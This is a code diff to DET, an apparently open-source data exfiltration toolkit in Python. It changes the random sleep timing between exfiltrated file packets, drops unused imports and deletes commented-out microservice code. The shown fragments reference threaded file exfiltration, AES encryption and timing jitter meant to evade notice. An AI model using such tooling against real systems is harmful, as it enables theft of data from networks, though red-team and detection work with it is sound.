@@ -9,15 +9,13 @@ import string
 import time
 import json
 import signal
-import base64
 import struct
 import tempfile
-from random import randint
+from random import randint, uniform
 from os import listdir
 from os.path import isfile, join
 from Crypto.Cipher import AES
 from zlib import compress, decompress
-import requests
 
 try:
     from cStringIO import StringIO
@@ -224,12 +222,6 @@ class Exfiltration(object):
     def retrieve_data(self, data):
         global files
         try:
-
-            try:
-                data = data['from_file']
-            except:
-                pass
-
             message = data
             if (message.count("|!|") >= 2):
                 info("Received {0} bytes".format(len(message)))
@@ -295,7 +287,7 @@ class ExfiltrateFile(threading.Thread):
             self.jobid, os.path.basename(self.file_to_send), self.checksum)
         plugin_send_function(data)
 
-        time_to_sleep = randint(1, MAX_TIME_SLEEP)
+        time_to_sleep = uniform(0, MAX_TIME_SLEEP)
         info("Sleeping for %s seconds" % time_to_sleep)
         time.sleep(time_to_sleep)
 
@@ -321,7 +313,7 @@ class ExfiltrateFile(threading.Thread):
             plugin_send_function(data)
             packet_index = packet_index + 1
 
-            time_to_sleep = randint(1, MAX_TIME_SLEEP)
+            time_to_sleep = uniform(0, MAX_TIME_SLEEP)
             display_message("Sleeping for %s seconds" % time_to_sleep)
             time.sleep(time_to_sleep)
 
@@ -333,10 +325,12 @@ class ExfiltrateFile(threading.Thread):
         f.close()
         sys.exit(0)
 
+
 def signal_handler(bla, frame):
     global threads
     warning('Killing DET and its subprocesses')
     os.kill(os.getpid(), signal.SIGKILL)
+
 
 def main():
     global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
@@ -374,7 +368,7 @@ def main():
     ok("CTRL+C to kill DET")
 
     MIN_TIME_SLEEP = int(config['min_time_sleep'])
-    MAX_TIME_SLEEP = int(config['max_time_sleep'])
+    MAX_TIME_SLEEP = float(config['max_time_sleep'])
     MIN_BYTES_READ = int(config['min_bytes_read'])
     MAX_BYTES_READ = int(config['max_bytes_read'])
     COMPRESSION    = bool(config['compression'])
@@ -382,7 +376,7 @@ def main():
     app = Exfiltration(results, KEY)
 
     # LISTEN/PROXY MODE
-    if ((results.listen or results.proxy) and not results.microservice):
+    if (results.listen or results.proxy):
         threads = []
         plugins = app.get_plugins()
         for plugin in plugins:
@@ -393,22 +387,6 @@ def main():
             thread.daemon = True
             thread.start()
             threads.append(thread)
-    '''
-    elif results.microservice:
-        plugins = app.get_plugins()
-        plugin = plugins[0]
-        thread = threading.Thread(target=plugins[plugin]['microserivce_proxy'], args=(app,))
-        threads.append(thread)
-        thread.daemon = True
-        thread.start()
-    elif True:
-        plugins = app.get_plugins()
-        plugin = plugins[0]
-        thread = threading.Thread(target=plugins[plugin]['listen_ms'], args=(app,))
-        threads.append(thread)
-        thread.daemon = True
-        thread.start()
-    '''
     # EXFIL mode
     else:
         if (results.folder is None and results.file is None):
